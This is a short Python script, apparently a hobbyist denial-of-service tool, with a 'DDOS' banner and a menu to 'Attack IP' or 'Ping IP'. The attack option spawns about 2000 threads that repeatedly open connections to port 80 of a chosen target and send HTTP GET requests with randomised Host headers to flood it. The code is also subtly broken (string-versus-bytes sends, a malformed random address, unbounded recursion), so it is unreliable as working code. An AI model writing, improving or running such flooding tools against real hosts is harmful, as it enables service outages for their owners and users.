from colorama import Back, Fore, Style
import pythonping, socket, threading, time, random

def main():

    print(f"""
    {Style.BRIGHT}  {Fore.LIGHTYELLOW_EX}
    \t ____    ____    _____   ______
    \t|    \  |    \  |     | |
    \t|     | |     | |  _  | |______
    \t|     | |     | |     |        |
    \t|____/  |____/  |_____|  ______|
    \t                           
    \n\n""")



    print(f"""{Style.BRIGHT} {Fore.LIGHTYELLOW_EX}
[1.]  Attack IP 
[2.]  Ping IP\n
""")

    try : 

        opt = int(input('Enter your choice:\t'))

        if opt == 1 : 

            def attack():
                a = random.randint(0,256)
                b = random.randint(0,256)
                c = random.randint(0,256)
                d = random.randint(0,256)
                p = '.'
                x = (f'{a} + {p} + {b} + {p} + {c} + {p} + {d}')

                try:
                    target = input('Enter Target\'s IP:\t')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                    s.connect((target, 80))  
                    print ("GET /" + target + " HTTP/1.1")
                    s.send("GET /" + target + " HTTP/1.1\r\n")  
                    s.send("Host: " + x  + "\r\n\r\n");  
                    s.close()

                except socket.error as se : 
                    print(f'Error Occured :\n{se}')

                for i in range(0, 2000) : 
                    time.sleep(0.0010)
                    attack()

            def threader():
                threads=[]
                for i in range(1, 2000):
                    t=threading.Thread(target=attack)
                    threads.append(t)
                    t.start()
            threader()


        elif opt == 2: 
            ip = input('Enter IP Address: \t')
            print(f'\n{pythonping.ping(target=ip, timeout=10, count= 6)}\n')
        
        else : 
            print(f'Invaid Option {opt}\nThanks For Using Our Script')

    except KeyboardInterrupt: 
        print(f'\n\n{Style.BRIGHT} {Fore.LIGHTYELLOW_EX}Exiting The Program! \n Thanks For using it\n')
        quit()

main()